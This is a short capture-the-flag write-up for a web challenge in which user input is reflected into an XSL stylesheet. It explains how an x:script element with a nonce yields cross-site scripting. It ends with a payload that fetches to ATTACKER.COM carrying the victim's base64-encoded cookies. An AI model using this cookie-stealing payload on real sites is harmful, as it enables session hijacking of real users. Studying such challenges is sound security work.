<h1>PlanetSheet</h1>

<blockquote>
  <p>Let's start by warming a little bit! I love planets and I hate sheets so I made this website to show my favorite planets. Flag is in admin cookie.\
  <strong>Link:</strong> http://20.233.9.240:1337</p>
</blockquote>

<p>In this challenge our input is reflected into an <a href="https://developer.mozilla.org/en-US/docs/Web/XSLT">XSL document</a>. For instance:</p>

<p>```markup
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>Planets</h2>
    <p>
OUR INPUT    <xsl:for-each select="catalog/cd">
      <xsl:value-of select="title"/>
      <xsl:if test="position() &lt; last()-1">
        <xsl:text>, </xsl:text>
      </xsl:if>
      <xsl:if test="position()=last()-1">
        <xsl:text>, and </xsl:text>
      </xsl:if>
      <xsl:if test="position()=last()">
        <xsl:text>!</xsl:text>
      </xsl:if>
    </xsl:for-each>
    </p>
  </body>
  </html>
</xsl:template></p>

<p></xsl:stylesheet>
```</p>

<p>When rendered in the browser, this yields an error.</p>

<p><img src="../../.gitbook/assets/Screenshot 2022-04-11 at 11.59.45 AM.png" alt="" /></p>

<p>Since the <code>Content-Type</code> is <code>text/xsl</code>, we can use <code>&lt;x:script&gt;</code> to perform XSS (<a href="https://github.com/BlackFan/content-type-research/blob/master/XSS.md">source</a>).</p>

<p>The final payload was</p>

<p><code>xml
&lt;x:script xmlns:x="http://www.w3.org/1999/xhtml" nonce="Y8Ret8N5CPXrSG"&gt;fetch(`http://ATTACKER.COM/${btoa(document.cookie)}`)&lt;/x:script&gt;
</code></p>
